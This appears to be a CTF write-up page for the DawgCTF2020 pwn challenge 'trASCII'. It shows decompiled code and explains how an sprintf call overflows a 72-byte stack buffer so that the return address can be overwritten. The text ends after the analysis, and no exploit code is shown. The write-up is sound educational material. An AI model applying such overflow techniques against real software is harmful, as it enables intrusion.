@@ -1,0 +1,363 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>DawgCTF2020 Writeup - trASCII | TaQini</title><meta name="description" content="DawgCTF2020 Writeup - trASCII"><meta name="keywords" content="pwn,bof,shellcode,ascii shellcode"><meta name="author" content="TaQini,742954809@qq.com"><meta name="copyright" content="TaQini"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><link rel="preconnect" href="https://hm.baidu.com"><link rel="preconnect" href="http://ta.qq.com"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="-dhsoFQadgDKJR7BsB6bc1j5yfqjUpg_b-1pFjr7o3x"><meta name="baidu-site-verification" content="MmFa3MzTgG"><meta name="360-site-verification" content="fddfed369e9e91402671f846d08e64c7"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="DawgCTF2020 Writeup - trASCII"><meta name="twitter:description" content="DawgCTF2020 Writeup - trASCII"><meta name="twitter:image" content="http://image.taqini.space/img/dawg.png"><meta property="og:type" content="article"><meta property="og:title" content="DawgCTF2020 Writeup - trASCII"><meta property="og:url" content="http://taqini.space/2020/04/13/DawgCTF-2020-Pwn-trASCII-Writeup/"><meta property="og:site_name" content="TaQini"><meta property="og:description" content="DawgCTF2020 Writeup - trASCII"><meta property="og:image" content="http://image.taqini.space/img/dawg.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
+var t = Cookies.get("theme");
+if (autoChangeMode == '1'){
+const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+if (t === undefined){
+  if (isLightMode) activateLightMode()
+  else if (isDarkMode) activateDarkMode()
+  else if (isNotSpecified || hasNoSupport){
+    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+    now = new Date();
+    hour = now.getHours();
+    isNight = hour < 6 || hour >= 18
+    isNight ? activateDarkMode() : activateLightMode()
+}
+} else if (t == 'light') activateLightMode()
+else activateDarkMode()
+
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="http://taqini.space/2020/04/13/DawgCTF-2020-Pwn-trASCII-Writeup/"><link rel="next" title="DawgCTF2020 Pwn Writeup" href="http://taqini.space/2020/04/13/DawgCTF-2020-Pwn-Writeup/"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+  google_ad_client: 'ca-pub-3600751152886041',
+  enable_page_level_ads: 'true'
+});</script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?303b8d57c50af6b9774ac6c5de30548b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-159447434-1', 'auto');
+ga('send', 'pageview');
+</script><script src="http://tajs.qq.com/stats?sId=66525622" charset="UTF-8"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><!-- Matomo Image Tracker--><!--img(src='http://ma.taqini.space/matomo.php?idsite=1&rec=1' style='border:0' alt='')--><!-- End Matomo--><!-- Matomo--><script type="text/javascript">var _paq = window._paq || [];
+/* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+_paq.push(['trackPageView']);
+_paq.push(['enableLinkTracking']);
+(function() {
+var u="//ma.taqini.space/";
+_paq.push(['setTrackerUrl', u+'matomo.php']);
+_paq.push(['setSiteId', '1']);
+var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+})();</script><!-- End Matomo Code--><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"http://taqini.space/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    title: 'Snackbar.bookmark.title',
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: {"languages":{"author":"作者: TaQini","link":"链接: http://taqini.space/2020/04/13/DawgCTF-2020-Pwn-trASCII-Writeup/","source":"来源: TaQini","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: {"bookmark":{"title":"Snackbar.bookmark.title","message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"top-center"},
+  baiduPush: true,
+  isHome: false,
+  isPost: true
+  
+}</script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">TaQini</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msgboard/"><i class="fa-fw fa fa-commenting"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-book" aria-hidden="true"></i><span> 书单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://yeasy.gitbooks.io/docker_practice" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Docker从入门到实践</span></a></li><li><a class="site-page" href="https://bingohuang.gitbooks.io/progit2/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Pro Git</span></a></li><li><a class="site-page" href="https://wiki.x10sec.org/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> CTF Wiki</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gears" aria-hidden="true"></i><span> 工具</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://git.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-git"></i><span> Gogs平台</span></a></li><li><a class="site-page" href="ftp://47.100.63.152" target="_blank" rel="noopener"><i class="fa-fw fa fa-cloud"></i><span> FTP服务器</span></a></li><li><a class="site-page" href="http://ma.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-bar-chart"></i><span> Matomo统计</span></a></li><li><a class="site-page" href="https://shimo.im" target="_blank" rel="noopener"><i class="fa-fw fa fa-edit"></i><span> 石墨文档</span></a></li><li><a class="site-page" href="http://www.hehuan.co/" target="_blank" rel="noopener"><i class="fa-fw fa fa-heart"></i><span> 颜文字(๑╹ヮ╹๑)ﾉ</span></a></li><li><a class="site-page" href="http://www.fontawesome.com.cn/faicons/" target="_blank" rel="noopener"><i class="fa-fw fa fa-flag"></i><span> fa图标库</span></a></li><li><a class="site-page" href="https://emojipedia.org/" target="_blank" rel="noopener"><i class="fa-fw fa fa-book"></i><span> Emoji百科</span></a></li><li><a class="site-page" href="/tools/"><i class="fa-fw fa fa-gears"></i><span> 更多工具</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gamepad" aria-hidden="true"></i><span> 游戏</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/#"><i class="fa-fw fa fa-gamepad"></i><span> 放松一下(๑¯◡¯๑)</span></a></li><li><a class="site-page" href="http://taqini.space/games/pacman/"><i class="fa-fw fa fa-gamepad"></i><span> Pacman 吃豆人</span></a></li><li><a class="site-page" href="http://taqini.space/games/react-tetris/"><i class="fa-fw fa fa-gamepad"></i><span> Tetris 俄罗斯方块</span></a></li><li><a class="site-page" href="http://taqini.space/games/battle-city/"><i class="fa-fw fa fa-gamepad"></i><span> BattleCtiy 坦克大战</span></a></li><li><a class="site-page" href="http://taqini.space/games/2048/"><i class="fa-fw fa fa-gamepad"></i><span> 2048 经典2048</span></a></li><li><a class="site-page" href="http://taqini.space/games/star-battle/"><i class="fa-fw fa fa-gamepad"></i><span> StarBattle 星际大战</span></a></li><li><a class="site-page" href="http://taqini.space/games/mikutap/"><i class="fa-fw fa fa-music"></i><span> MikuTap 初音未来</span></a></li><li><a class="site-page" href="http://taqini.space/games/sliding-puzzle/"><i class="fa-fw fa fa-gamepad"></i><span> SlidingPuzzle 滑块拼图</span></a></li><li><a class="site-page" href="http://taqini.space/games/backbone-game-engine/super-mario-bros/"><i class="fa-fw fa fa-gamepad"></i><span> MarioCraft</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-code" aria-hidden="true"></i><span> 更多</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About me</span></a></li><li><a class="site-page" href="http://ctf.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-flag"></i><span> CTFq平台</span></a></li><li><a class="site-page" href="http://note.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-book"></i><span> Pwn解题本</span></a></li><li><a class="site-page" href="http://taqini.space/city-vein/"><i class="fa-fw fa fa-star"></i><span> 城市脉络</span></a></li><li><a class="site-page" href="/2020/02/22/index-of-pwn/"><i class="fa-fw fa fa-chain"></i><span> Pwn索引</span></a></li><li><a class="site-page" href="/piao"><i class="fa-fw fa fa-link"></i><span> 漂亮前端</span></a></li><li><a class="site-page" href="https://pusheen.com/" target="_blank" rel="noopener"><i class="fa-fw fa fa-star"></i><span> Pusheen喵喵</span></a></li><li><a class="site-page" href="/todo/"><i class="fa-fw fa fa-check-square"></i><span> TODO List</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">37</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">102</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">7</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msgboard/"><i class="fa-fw fa fa-commenting"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-book" aria-hidden="true"></i><span> 书单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://yeasy.gitbooks.io/docker_practice" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Docker从入门到实践</span></a></li><li><a class="site-page" href="https://bingohuang.gitbooks.io/progit2/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Pro Git</span></a></li><li><a class="site-page" href="https://wiki.x10sec.org/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> CTF Wiki</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gears" aria-hidden="true"></i><span> 工具</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://git.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-git"></i><span> Gogs平台</span></a></li><li><a class="site-page" href="ftp://47.100.63.152" target="_blank" rel="noopener"><i class="fa-fw fa fa-cloud"></i><span> FTP服务器</span></a></li><li><a class="site-page" href="http://ma.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-bar-chart"></i><span> Matomo统计</span></a></li><li><a class="site-page" href="https://shimo.im" target="_blank" rel="noopener"><i class="fa-fw fa fa-edit"></i><span> 石墨文档</span></a></li><li><a class="site-page" href="http://www.hehuan.co/" target="_blank" rel="noopener"><i class="fa-fw fa fa-heart"></i><span> 颜文字(๑╹ヮ╹๑)ﾉ</span></a></li><li><a class="site-page" href="http://www.fontawesome.com.cn/faicons/" target="_blank" rel="noopener"><i class="fa-fw fa fa-flag"></i><span> fa图标库</span></a></li><li><a class="site-page" href="https://emojipedia.org/" target="_blank" rel="noopener"><i class="fa-fw fa fa-book"></i><span> Emoji百科</span></a></li><li><a class="site-page" href="/tools/"><i class="fa-fw fa fa-gears"></i><span> 更多工具</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gamepad" aria-hidden="true"></i><span> 游戏</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/#"><i class="fa-fw fa fa-gamepad"></i><span> 放松一下(๑¯◡¯๑)</span></a></li><li><a class="site-page" href="http://taqini.space/games/pacman/"><i class="fa-fw fa fa-gamepad"></i><span> Pacman 吃豆人</span></a></li><li><a class="site-page" href="http://taqini.space/games/react-tetris/"><i class="fa-fw fa fa-gamepad"></i><span> Tetris 俄罗斯方块</span></a></li><li><a class="site-page" href="http://taqini.space/games/battle-city/"><i class="fa-fw fa fa-gamepad"></i><span> BattleCtiy 坦克大战</span></a></li><li><a class="site-page" href="http://taqini.space/games/2048/"><i class="fa-fw fa fa-gamepad"></i><span> 2048 经典2048</span></a></li><li><a class="site-page" href="http://taqini.space/games/star-battle/"><i class="fa-fw fa fa-gamepad"></i><span> StarBattle 星际大战</span></a></li><li><a class="site-page" href="http://taqini.space/games/mikutap/"><i class="fa-fw fa fa-music"></i><span> MikuTap 初音未来</span></a></li><li><a class="site-page" href="http://taqini.space/games/sliding-puzzle/"><i class="fa-fw fa fa-gamepad"></i><span> SlidingPuzzle 滑块拼图</span></a></li><li><a class="site-page" href="http://taqini.space/games/backbone-game-engine/super-mario-bros/"><i class="fa-fw fa fa-gamepad"></i><span> MarioCraft</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-code" aria-hidden="true"></i><span> 更多</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About me</span></a></li><li><a class="site-page" href="http://ctf.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-flag"></i><span> CTFq平台</span></a></li><li><a class="site-page" href="http://note.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-book"></i><span> Pwn解题本</span></a></li><li><a class="site-page" href="http://taqini.space/city-vein/"><i class="fa-fw fa fa-star"></i><span> 城市脉络</span></a></li><li><a class="site-page" href="/2020/02/22/index-of-pwn/"><i class="fa-fw fa fa-chain"></i><span> Pwn索引</span></a></li><li><a class="site-page" href="/piao"><i class="fa-fw fa fa-link"></i><span> 漂亮前端</span></a></li><li><a class="site-page" href="https://pusheen.com/" target="_blank" rel="noopener"><i class="fa-fw fa fa-star"></i><span> Pusheen喵喵</span></a></li><li><a class="site-page" href="/todo/"><i class="fa-fw fa fa-check-square"></i><span> TODO List</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#trASCII-450pt"><span class="toc_mobile_items-text">trASCII (450pt)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Description"><span class="toc_mobile_items-text">Description</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Attachment"><span class="toc_mobile_items-text">Attachment</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Analysis"><span class="toc_mobile_items-text">Analysis</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#buffer-overflow"><span class="toc_mobile_items-text">buffer overflow</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#executable-trash"><span class="toc_mobile_items-text">executable trash</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Solution"><span class="toc_mobile_items-text">Solution</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#ret2trash"><span class="toc_mobile_items-text">ret2trash</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#ascii-shellcode"><span class="toc_mobile_items-text">ascii shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#getshell"><span class="toc_mobile_items-text">getshell</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#More"><span class="toc_mobile_items-text">More</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#Some-techniques"><span class="toc_mobile_items-text">Some techniques</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#Example"><span class="toc_mobile_items-text">Example</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#trASCII-450pt"><span class="toc-text">trASCII (450pt)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attachment"><span class="toc-text">Attachment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analysis"><span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#buffer-overflow"><span class="toc-text">buffer overflow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#executable-trash"><span class="toc-text">executable trash</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-text">Solution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2trash"><span class="toc-text">ret2trash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii-shellcode"><span class="toc-text">ascii shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#More"><span class="toc-text">More</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Some-techniques"><span class="toc-text">Some techniques</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example"><span class="toc-text">Example</span></a></li></ol></li></ol></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(http://image.taqini.space/img/dawg.png)"><div id="post-info"><div id="post-title"><div class="posttitle">DawgCTF2020 Writeup - trASCII</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2020-04-13<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2020-04-13</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span><div class="post-meta-wordcount"><i class="fa fa-file-word-o post-meta__icon fa-fw" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">840</span><span class="post-meta__separator">|</span><i class="fa fa-clock-o post-meta__icon fa-fw" aria-hidden="true"></i><span>阅读时长: 5 分钟</span><div class="post-meta-pv-cv"><span class="post-meta__separator">|</span><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span><span class="post-meta__separator">|</span><i class="fa fa-comments-o post-meta__icon fa-fw" aria-hidden="true"></i><span>评论数:</span><a href="/2020/04/13/DawgCTF-2020-Pwn-trASCII-Writeup/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/2020/04/13/DawgCTF-2020-Pwn-trASCII-Writeup/" itemprop="commentCount"></span></a></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h2 id="trASCII-450pt"><a href="#trASCII-450pt" class="headerlink" title="trASCII (450pt)"></a>trASCII (450pt)</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>Author: trashcanna @annatea16</p>
+</blockquote>
+<h3 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h3><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/trASCII/trASCII" target="_blank" rel="noopener">trASCII</a></p>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>the program can convert our input into the format of <code>%c%d</code>:</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% .&#x2F;trASCII</span><br><span class="line">Welcome to trASCII, a program by trashcanna!</span><br><span class="line">We&#39;ll take all your random ASCII garbage and convert it into something magical!</span><br><span class="line">What garbage do you have for us today?</span><br><span class="line">ABCDDEEFF</span><br><span class="line">Thanks for the trash! Here&#39;s how I compressed it: A1B1C1D2E2F2</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p><code>ABCDDEEFF</code> -&gt; <code>A1B1C1D2E2F2</code></p>
+</blockquote>
+<p>allowed char in our input (from <code>0</code> to <code>z</code>): </p>
+<blockquote>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0123456789:;&lt;&#x3D;&gt;?@AB</span><br><span class="line">CDEFGHIJKLMNOPQRSTU</span><br><span class="line">VWXYZ[\]^_&#96;abcdefgh</span><br><span class="line">ijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<h4 id="buffer-overflow"><a href="#buffer-overflow" class="headerlink" title="buffer overflow"></a>buffer overflow</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s[<span class="number">72</span>]; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">fgets(trash, <span class="number">0x2710</span>, <span class="built_in">stdin</span>);</span><br><span class="line">len = <span class="built_in">strlen</span>(trash);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (len - <span class="number">1</span>); ++i )&#123;</span><br><span class="line">  cnt = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; (len - <span class="number">1</span>) &amp;&amp; trash[i] == trash[i + <span class="number">1</span>] )&#123;</span><br><span class="line">    ++cnt;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( trash[i] &gt; <span class="string">'z'</span> || trash[i] &lt;= <span class="string">'/'</span> )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"That's not trash, that's recycling"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  s[<span class="built_in">strlen</span>(s) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  s[<span class="built_in">strlen</span>(s)] = trash[i];</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s[v0], <span class="string">"%d"</span>, cnt);  <span class="comment">// bof here</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(trash, <span class="number">0</span>, <span class="number">0x2710</span>u);     <span class="comment">// clear trash</span></span><br><span class="line"><span class="built_in">strcpy</span>(trash, s);              <span class="comment">// copy result to trash</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The destination buffer(72 bytes) of <code>sprintf(&amp;s[v0], &quot;%d&quot;, cnt)</code>  is in stack and it will be overflowed while the length of convert result of <code>trash</code> is long enough.</p>
+<p>Then the return address will be overwritten by the convert result of <code>trash</code></p>
